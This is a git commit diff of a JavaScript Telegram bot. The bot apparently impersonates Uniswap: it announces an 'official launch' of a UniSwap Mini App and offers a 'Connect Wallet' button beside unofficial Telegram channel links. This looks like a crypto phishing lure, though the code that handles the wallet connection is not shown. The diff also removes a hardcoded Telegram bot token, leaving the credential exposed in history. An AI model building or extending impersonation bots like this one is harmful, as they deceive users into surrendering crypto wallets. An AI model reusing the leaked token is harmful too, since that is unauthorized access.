b526be5800e8625e9b6b2f8bce3b32413eb7cdc5
Victor Manuel Avila Tamayo <108910493+WinterABW@users.noreply.github.com>
2024-08-24 15:32:25 -0400

    update

--- bot.js
+++ bot.js
@@ -1,30 +1,32 @@
 const { Telegraf, Markup } = require("telegraf");
 const path = require("path");
-
-const botApp = "https://t.me/UniSwapbot/UniSwapApp";
-const token = "6918635120:AAHhIx8csASASWBp3LTeRxBLjWv0Jm3jCjg";
+const { token, botApp, chanel, suportt, twitter } = require("./urls.json");
 
 const bot = new Telegraf(token);
 
 bot.start((ctx) => {
-  const imagePath = path.join(__dirname, 'photo_2024-08-24_14-40-26.jpg');
-  
+  const imagePath = path.join(__dirname, "photo_2024-08-24_14-40-26.jpg");
   ctx.replyWithPhoto(
-    { source: imagePath }, 
+    { source: imagePath },
     {
-      caption: `👏 Minting a new beginning on [Telegram](https://t.me/durov)\n\n` +
-      ` We announce the official launch of the Mini App version of UniSwap.org.`,
-      parse_mode: 'Markdown', 
+      caption:
+        `👏 Minting a new beginning on [Telegram](https://t.me/durov)\n\n` +
+        ` We announce the official launch of the Mini App version of UniSwap.org.`,
+      parse_mode: "Markdown",
       ...Markup.inlineKeyboard([
-        [Markup.button.url('🦄 Mini App', 'https://t.me/UniSwapbot/UniSwapApp')],
-        [Markup.button.callback('Connect Wallet', 'xxxx'),Markup.button.url('Twitter', 'https://x.com/uniswap')],
-        [Markup.button.url('Chanel', 'https://t.me/UniSwapNew'),Markup.button.url('Suportt', 'https://t.me/UniSwapTips')],
-      ])
+        [Markup.button.url("🦄 Mini App", botApp)],
+        [
+          Markup.button.callback("Connect Wallet", "xxxx"),
+          Markup.button.url("Twitter", twitter),
+        ],
+        [
+          Markup.button.url("Chanel", chanel),
+          Markup.button.url("Suportt", suportt),
+        ],
+      ]),
     }
   );
 });
 
-
 bot.launch();
-
 console.log("Bot is running...");
